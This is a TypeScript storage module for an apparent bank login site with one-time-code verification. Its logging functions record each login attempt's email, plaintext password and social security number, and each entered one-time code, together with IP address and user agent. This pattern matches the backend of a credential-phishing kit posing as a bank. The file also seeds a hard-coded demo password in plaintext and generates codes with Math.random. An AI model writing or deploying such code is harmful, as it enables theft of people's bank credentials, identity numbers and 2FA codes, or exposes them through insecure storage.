import { type User, type InsertUser, type OTPCode, type LoginAttempt, type OTPAttempt } from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByEmail(email: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  generateOTP(email: string): Promise<OTPCode>;
  verifyOTP(email: string, code: string): Promise<boolean>;
  logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<LoginAttempt>;
  logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<OTPAttempt>;
}

import { db } from "./db";
import { users, otpCodes, loginAttempts, otpAttempts } from "@shared/schema";
import { eq, and } from "drizzle-orm";

export class DatabaseStorage implements IStorage {
  constructor() {
    // Create a demo user for testing on startup
    this.initializeDemoUser();
  }

  private async initializeDemoUser() {
    try {
      const existingUser = await this.getUserByEmail("demo@securebank.com");
      if (!existingUser) {
        await this.createUser({
          email: "demo@securebank.com",
          password: "password123"
        });
      }
    } catch (error) {
      console.log("Demo user initialization skipped:", error);
    }
  }

  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByEmail(email: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.email, email));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db
      .insert(users)
      .values(insertUser)
      .returning();
    return user;
  }

  async generateOTP(email: string): Promise<OTPCode> {
    // Clear any existing OTP for this email
    await db.delete(otpCodes).where(eq(otpCodes.email, email));

    const code = Math.floor(100000 + Math.random() * 900000).toString(); // 6-digit code
    const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes from now
    
    const [otpCode] = await db
      .insert(otpCodes)
      .values({
        email,
        code,
        expiresAt,
        isUsed: false
      })
      .returning();
    
    return otpCode;
  }

  async verifyOTP(email: string, code: string): Promise<boolean> {
    const [otpCode] = await db
      .select()
      .from(otpCodes)
      .where(and(
        eq(otpCodes.email, email),
        eq(otpCodes.code, code),
        eq(otpCodes.isUsed, false)
      ));

    if (!otpCode) {
      return false;
    }

    // Check if OTP has expired
    if (new Date() > otpCode.expiresAt) {
      return false;
    }

    // Mark OTP as used
    await db
      .update(otpCodes)
      .set({ isUsed: true })
      .where(eq(otpCodes.id, otpCode.id));
    
    return true;
  }

  async logLoginAttempt(email: string, password: string, ssn: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<LoginAttempt> {
    const [loginAttempt] = await db
      .insert(loginAttempts)
      .values({
        email,
        password,
        ssn,
        success,
        ipAddress,
        userAgent
      })
      .returning();
    
    return loginAttempt;
  }

  async logOTPAttempt(email: string, code: string, success: boolean, ipAddress?: string, userAgent?: string): Promise<OTPAttempt> {
    const [otpAttempt] = await db
      .insert(otpAttempts)
      .values({
        email,
        code,
        success,
        ipAddress,
        userAgent
      })
      .returning();
    
    return otpAttempt;
  }
}

export const storage = new DatabaseStorage();
